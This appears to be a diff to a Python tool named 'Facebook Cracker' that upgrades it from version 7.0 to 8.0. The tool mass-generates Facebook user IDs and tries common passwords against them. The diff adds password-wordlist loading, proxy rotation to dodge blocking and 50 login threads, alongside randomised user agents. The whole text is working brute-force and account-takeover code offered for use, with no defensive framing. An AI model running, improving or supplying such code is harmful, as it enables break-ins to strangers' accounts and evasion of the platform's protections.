@@ -43,7 +43,7 @@ logo = f"""
 {A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 {Y}Developer : Abd Ur Rab
 {Y}Tool Name : Facebook Cracker
-{Y}Version   : 7.0 (Fully Upgraded)
+{Y}Version   : 8.0 (Fully Upgraded)
 {Y}Status    : Active
 {Y}Date      : {current_date}
 {Y}Time      : {current_time}
@@ -82,8 +82,16 @@ def select_country():
 def random_ua():
     return f"Mozilla/5.0 (Linux; Android {random.randint(7,12)}; SM-G{random.randint(900,999)}F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(80,115)}.0.{random.randint(4000,5000)}.0 Mobile Safari/537.36"
 
+#----------------------------[LOAD PASSWORDS]--------------------------------#
+def load_passwords():
+    if os.path.exists("passwords.txt"):
+        with open("passwords.txt", "r") as f:
+            return [line.strip() for line in f.readlines()]
+    else:
+        return ["123456", "password", "pakistan", "786786", "112233"]
+
 #----------------------------[FACEBOOK LOGIN]--------------------------------#
-def facebook_login(uid, password, total, completed):
+def facebook_login(uid, password, total, completed, proxy=None):
     headers = {
         "User-Agent": random_ua(),
         "Accept-Language": "en-US,en;q=0.9",
@@ -95,6 +103,8 @@ def facebook_login(uid, password, total, completed):
     
     try:
         session = requests.Session()
+        if proxy:
+            session.proxies = {"http": proxy, "https": proxy}
         response = session.get(url, headers=headers).json()
         
         if "session_key" in response:
@@ -136,18 +146,29 @@ def main():
     # Generate IDs
     limit = int(input(f"{G}Enter Number of IDs to Generate: {A}"))
     user_ids = [prefix + str(random.randint(1000000, 9999999)) for _ in range(limit)]
-    passwords = ["123456", "password", "pakistan", "786786", "112233"]
+    passwords = load_passwords()
+    
+    # Load proxies (if available)
+    proxies = []
+    if os.path.exists("proxies.txt"):
+        with open("proxies.txt", "r") as f:
+            proxies = [line.strip() for line in f.readlines()]
     
     os.system("clear")
     print(logo)
     print(f"{G}Total IDs: {A}{limit}")
+    print(f"{G}Total Passwords: {A}{len(passwords)}")
     print(f"{G}Cracking Started... Please Wait!")
     
     total_tasks = len(user_ids) * len(passwords)
     completed_tasks = [0]  # Using a list to make it mutable in threads
     
     with ThreadPoolExecutor(max_workers=50) as executor:  # Increased max_workers for better performance
-        futures = [executor.submit(facebook_login, uid, pw, total_tasks, completed_tasks) for uid in user_ids for pw in passwords]
+        futures = []
+        for uid in user_ids:
+            for pw in passwords:
+                proxy = random.choice(proxies) if proxies else None
+                futures.append(executor.submit(facebook_login, uid, pw, total_tasks, completed_tasks, proxy))
         for future in as_completed(futures):
             future.result()
 
